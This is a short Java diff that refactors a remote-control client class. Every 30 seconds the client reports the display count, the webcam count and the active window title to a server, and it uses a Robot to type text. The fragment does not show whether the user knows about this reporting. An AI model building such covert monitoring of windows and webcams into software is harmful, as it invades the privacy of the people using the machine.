@@ -26,15 +26,17 @@ public class ControlComponents {
     public static boolean ROBOT = true;
 
     public static void startUpdater() {
-        ConnectClient.EXECUTOR.scheduleAtFixedRate(() -> {
-            try {
-                SystemInfo si = new SystemInfo();
-                ConnectClient.msg("updateinfo " + si.getHardware().getDisplays().size() + " " + Webcam.getWebcams().size() + " " + getActiveWindowTitle());
-            } catch (Exception ignored) {
-                ConnectClient.msg("updateinfo 0 0 " + getActiveWindowTitle());
-            }
-            ConnectClient.msg("rping");
-        }, 1, 30, TimeUnit.SECONDS);
+        ConnectClient.EXECUTOR.scheduleAtFixedRate(ControlComponents::sendBasicInfo, 1, 30, TimeUnit.SECONDS);
+    }
+
+    public static void sendBasicInfo() {
+        try {
+            SystemInfo si = new SystemInfo();
+            ConnectClient.msg("updateinfo " + si.getHardware().getDisplays().size() + " " + Webcam.getWebcams().size() + " " + getActiveWindowTitle());
+        } catch (Exception ignored) {
+            ConnectClient.msg("updateinfo 0 0 " + getActiveWindowTitle());
+        }
+        ConnectClient.msg("rping");
     }
 
     public static void typeString(Robot robot, String text) {
